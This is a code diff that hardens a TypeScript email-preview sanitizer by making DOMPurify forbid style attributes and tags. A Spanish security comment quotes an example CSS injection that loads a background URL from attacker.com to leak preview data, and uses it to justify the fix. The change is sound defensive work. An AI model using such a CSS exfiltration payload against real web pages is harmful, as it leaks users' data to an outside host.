@@ -158,15 +158,26 @@ export function configureDOMPurify(): void {
 configureDOMPurify();
 
 /**
- * Sanitiza HTML de email permitiendo estilos inline (necesarios para templates de email).
- * Bloquea scripts, event handlers y URLs javascript: pero preserva style attributes y tags.
- * Usar solo para preview de templates de email — para contenido general usar sanitizeHtml().
+ * Sanitiza HTML de email para PREVIEW client-side. Bloquea scripts, event
+ * handlers y URLs javascript:.
+ *
+ * SECURITY: NO permite `style` attrs/tags. DOMPurify por default los permite,
+ * pero un atacante (admin de comunidad con acceso al overlay de un miembro)
+ * podría inyectar `<div style="background:url(https://attacker.com/leak)">`
+ * en `firstName` y exfiltrar datos del preview via CSS image request.
+ *
+ * Para el preview no necesitamos `style` (es solo display rápido). El email
+ * REAL que se manda va server-side y se construye con HTML controlado +
+ * variables ya escapadas via `escapeHtml` — no pasa por este sanitizer.
  */
 export function sanitizeEmailHtml(html: string): string {
 	if (!html) return '';
 	try {
-		// DOMPurify default config: allows style attrs/tags, blocks scripts and event handlers
-		return DOMPurify.sanitize(html, { FORCE_BODY: true });
+		return DOMPurify.sanitize(html, {
+			FORCE_BODY: true,
+			FORBID_ATTR: ['style'],
+			FORBID_TAGS: ['style'],
+		});
 	} catch (error) {
 		console.error('Error sanitizing email HTML:', error);
 		return '';
